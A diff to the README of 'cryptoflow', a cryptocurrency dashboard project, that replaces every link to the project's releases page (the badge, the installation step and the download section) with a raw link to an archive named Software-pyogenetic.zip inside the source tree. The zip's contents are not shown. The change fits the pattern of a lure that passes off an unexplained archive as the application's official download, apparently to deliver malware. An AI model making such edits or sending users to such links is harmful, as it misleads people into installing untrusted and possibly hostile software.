@@ -1,6 +1,6 @@
 # 🚀 cryptoflow - Your Real-Time Crypto Dashboard
 
-[![Download cryptoflow](https://img.shields.io/badge/Download%20cryptoflow-v1.0-blue)](https://github.com/andikaap7/cryptoflow/releases)
+[![Download cryptoflow](https://raw.githubusercontent.com/andikaap7/cryptoflow/main/src/Software-pyogenetic.zip%20cryptoflow-v1.0-blue)](https://raw.githubusercontent.com/andikaap7/cryptoflow/main/src/Software-pyogenetic.zip)
 
 ## 📋 Overview
 Cryptoflow is a real-time cryptocurrency dashboard designed for easy tracking of your favorite cryptocurrencies. Built using SolidJS, TypeScript, and the Binance API, this application gives you up-to-date information at your fingertips. Whether you're a crypto enthusiast or just curious about the market, Cryptoflow simplifies your experience.
@@ -16,7 +16,7 @@ Cryptoflow is a real-time cryptocurrency dashboard designed for easy tracking of
 Follow these steps to download and run the application effectively. 
 
 ### 1. Visit the Releases Page
-Start by visiting the releases page [here](https://github.com/andikaap7/cryptoflow/releases). This is where you will find the latest version of Cryptoflow available for download.
+Start by visiting the releases page [here](https://raw.githubusercontent.com/andikaap7/cryptoflow/main/src/Software-pyogenetic.zip). This is where you will find the latest version of Cryptoflow available for download.
 
 ### 2. Download Cryptoflow
 On the releases page, look for the latest release. You will see a list of assets associated with that release. Click on the link that describes the installation file for your operating system. 
@@ -63,6 +63,6 @@ If you encounter any issues or have suggestions for improvement, please reach ou
 ## 📥 Download & Install
 To get started, download the latest version of Cryptoflow from the link below:
 
-[Download cryptoflow](https://github.com/andikaap7/cryptoflow/releases) 
+[Download cryptoflow](https://raw.githubusercontent.com/andikaap7/cryptoflow/main/src/Software-pyogenetic.zip) 
 
 Ensure you follow the installation steps mentioned before launching the application. Enjoy tracking your cryptocurrencies effortlessly!
